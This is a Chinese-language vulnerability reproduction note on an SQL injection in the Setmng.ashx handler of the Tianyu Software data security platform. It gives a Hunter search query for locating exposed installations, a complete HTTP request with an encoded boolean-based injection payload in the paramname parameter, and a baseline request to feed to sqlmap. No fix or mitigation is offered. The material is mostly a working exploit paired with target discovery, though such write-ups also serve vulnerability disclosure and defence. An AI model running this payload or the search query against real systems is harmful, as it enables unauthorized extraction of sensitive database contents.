# 天喻软件数据安全平台 Setmng.ashx 存在SQL注入漏洞

# 一、漏洞简介
武汉天喻软件有限公司是依托国家企业信息化应用支撑软件工程技术研究中心成立的专业数字化设计软件提供商，武汉天喻软件有限公司天喻软件数据安全平台 Setmng.ashx 存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ 天喻软件数据安全平台

# 三、资产测绘
+ hunter`web.body="数据安全"&&web.body="天喻"`
+ 特征

![1702278921868-ed8c54f2-4af4-4217-a84e-a6b0effd021b.png](./img/NArvknPrBwITK6HP/1702278921868-ed8c54f2-4af4-4217-a84e-a6b0effd021b-609325.png)

# 四、漏洞复现
```plain
GET /p_handler/Setmng.ashx?operatetype=getparamvalue&paramname=1%27%2b(SELECT%20CHAR(90)%2bCHAR(103)%2bCHAR(103)%2bCHAR(71)%20WHERE%205505=5505%20AND%206796%20IN%20(SELECT%20(CHAR(113)%2bCHAR(98)%2bCHAR(112)%2bCHAR(118)%2bCHAR(113)%2b(SELECT%20(CASE%20WHEN%20(6796=6796)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2bCHAR(113)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113)%2bCHAR(113))))%2b%27 HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=ubyt433ue142lpuddbnjsybm
Upgrade-Insecure-Requests: 1
```

![1702279064168-29353ede-f5fc-436b-b54d-d05437eabfcd.png](./img/NArvknPrBwITK6HP/1702279064168-29353ede-f5fc-436b-b54d-d05437eabfcd-986150.png)

sqlmap

```plain
GET /p_handler/Setmng.ashx?operatetype=getparamvalue&paramname=1 HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=ubyt433ue142lpuddbnjsybm
Upgrade-Insecure-Requests: 1
```

![1702279315862-2a9e2004-44ef-4e0c-a7f2-28f741e9a1a1.png](./img/NArvknPrBwITK6HP/1702279315862-2a9e2004-44ef-4e0c-a7f2-28f741e9a1a1-694535.png)



> 更新: 2024-02-29 23:55:43  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/eapt0rguixag6qgu>